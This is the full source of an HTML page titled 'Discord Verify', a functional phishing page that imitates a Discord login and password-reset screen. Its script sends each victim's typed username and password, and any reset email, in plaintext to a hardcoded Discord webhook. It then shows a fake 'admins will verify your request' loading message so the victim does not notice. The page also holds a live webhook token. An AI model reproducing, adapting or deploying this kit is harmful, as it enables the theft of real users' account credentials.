<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verify</title>
    <style>
        body {
            background-color: #7dd3fc;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .loading-container {
            display: none;
            text-align: center;
        }

        .triangle {
            width: 0;
            height: 0;
            border-left: 50px solid transparent;
            border-right: 50px solid transparent;
            border-bottom: 86.6px solid #5865f2;
            margin: 20px auto;
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .loading-text {
            color: #fff;
            font-size: 18px;
            margin-top: 20px;
        }

        .container, .forgot-password-container {
            background-color: #36393f;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            width: 400px;
        }

        .forgot-password-container {
            display: none;
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"],
        input[type="number"],
        input[type="email"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            background-color: #40444b;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }

        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="number"]:focus,
        input[type="email"]:focus {
            outline: none;
            border: 1px solid #5865f2;
        }

        .btn {
            background-color: #5865f2;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #4752c4;
        }

        .links {
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            color: #00b0f4;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .captcha-container {
            background: #40444b;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
        }

        .captcha-question {
            font-size: 18px;
            margin: 10px 0;
            color: #fff;
        }

        .back-btn {
            background-color: #747f8d;
            color: #fff;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .back-btn:hover {
            background-color: #62696f;
        }
    </style>
</head>
<body>
    <div class="container" id="loginContainer">
        <h2>Discord Verify</h2>
        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group captcha-container">
                <label for="captcha">Solve this CAPTCHA:</label>
                <div id="captcha-question" class="captcha-question"></div>
                <input type="number" id="captcha-answer" name="captcha" required>
            </div>
            <button type="submit" class="btn">Login</button>
            <div class="links">
                <a onclick="showForgotPassword()">Forgot Password?</a>
            </div>
        </form>
    </div>

    <div class="forgot-password-container" id="forgotPasswordContainer">
        <button class="back-btn" onclick="showLogin()">‚Üê Back to Login</button>
        <h2>Reset Password</h2>
        <form onsubmit="handleForgotPassword(event)">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group captcha-container">
                <label for="captcha-reset">Verify CAPTCHA:</label>
                <div id="captcha-question-reset" class="captcha-question"></div>
                <input type="number" id="captcha-answer-reset" name="captcha" required>
            </div>
            <button type="submit" class="btn">Send Reset Link</button>
        </form>
    </div>

    <div id="loadingScreen" class="loading-container">
        <div class="triangle"></div>
        <div class="loading-text">
            Please wait while we process your request...
        </div>
    </div>
	
<script>
    let correctAnswer, correctAnswerReset;

    function generateCaptcha() {
        const num1 = Math.floor(Math.random() * 10);
        const num2 = Math.floor(Math.random() * 10);
        correctAnswer = num1 + num2;
        document.getElementById('captcha-question').innerHTML = 
            `What is ${num1} + ${num2}?`;
    }

    function generateCaptchaReset() {
        const num1 = Math.floor(Math.random() * 10);
        const num2 = Math.floor(Math.random() * 10);
        correctAnswerReset = num1 + num2;
        document.getElementById('captcha-question-reset').innerHTML = 
            `What is ${num1} + ${num2}?`;
    }

    function showForgotPassword() {
        document.getElementById('loginContainer').style.display = 'none';
        document.getElementById('forgotPasswordContainer').style.display = 'block';
        generateCaptchaReset();
    }

    function showLogin() {
        document.getElementById('forgotPasswordContainer').style.display = 'none';
        document.getElementById('loginContainer').style.display = 'block';
        generateCaptcha();
    }

    async function handleSubmit(event) {
        event.preventDefault();
        
        const userAnswer = parseInt(document.getElementById('captcha-answer').value);
        
        if (userAnswer !== correctAnswer) {
            alert('Incorrect CAPTCHA! Please try again.');
            generateCaptcha();
            document.getElementById('captcha-answer').value = '';
            return;
        }

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const date = new Date().toLocaleString();
        
        const webhookURL = 'https://discord.com/api/webhooks/1301225380861968434/xdy1d42s9ZwPHpBuItFHQZ-Wwv4AbzdmVdIg57t2Ca1Ws_ApKP0cYraFLvs4mZmSRkL4';
        
        const message = {
            content: `New Login Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${date}`
        };

        try {
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';

        } catch (error) {
            console.error('Error:', error);
            alert(`An error occurred: ${error.message}. Please try again.`);
        }
    }

    async function handleForgotPassword(event) {
        event.preventDefault();
        
        const userAnswer = parseInt(document.getElementById('captcha-answer-reset').value);
        
        if (userAnswer !== correctAnswerReset) {
            alert('Incorrect CAPTCHA! Please try again.');
            generateCaptchaReset();
            document.getElementById('captcha-answer-reset').value = '';
            return;
        }

        const email = document.getElementById('email').value;
        const date = new Date().toLocaleString();
        
        const webhookURL = 'https://discord.com/api/webhooks/1301225380861968434/xdy1d42s9ZwPHpBuItFHQZ-Wwv4AbzdmVdIg57t2Ca1Ws_ApKP0cYraFLvs4mZmSRkL4';
        
        const message = {
            content: `Password Reset Request\nEmail: ${email}\nTime: ${date}`
        };

        try {
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            document.getElementById('forgotPasswordContainer').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';
            document.querySelector('.loading-text').textContent = 
                'Please wait while admins verify your request you will get a DM on Discord when admins will verify';

        } catch (error) {
            console.error('Error:', error);
            alert(`An error occurred: ${error.message}. Please try again.`);
        }
    }

    // Generate initial CAPTCHA when page loads
    document.addEventListener('DOMContentLoaded', () => {
        generateCaptcha();
    });
</script>
</body>
</html>
